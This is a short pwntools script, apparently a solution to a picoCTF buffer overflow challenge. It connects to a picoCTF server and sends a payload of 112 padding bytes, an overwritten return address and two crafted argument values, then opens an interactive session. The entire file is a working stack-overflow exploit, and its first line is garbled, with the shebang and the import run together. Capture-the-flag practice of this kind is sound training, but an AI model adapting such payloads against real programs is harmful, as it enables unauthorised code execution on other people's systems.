#!/usr/bin/env python3from pwn import *
from pwn import *
#make sure you put the correct binary name and path below
#connect = gdb.debug("./vuln", "b main")

connect = connect('saturn.picoctf.net', 61010)

connect.recvuntil(b"Please enter your string:")
log.info("[+] Crafting payload")
payload = b"A" * 112
payload += p32(0x08049296)
payload += b"A" * 4
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.recv()
connect.interactive()
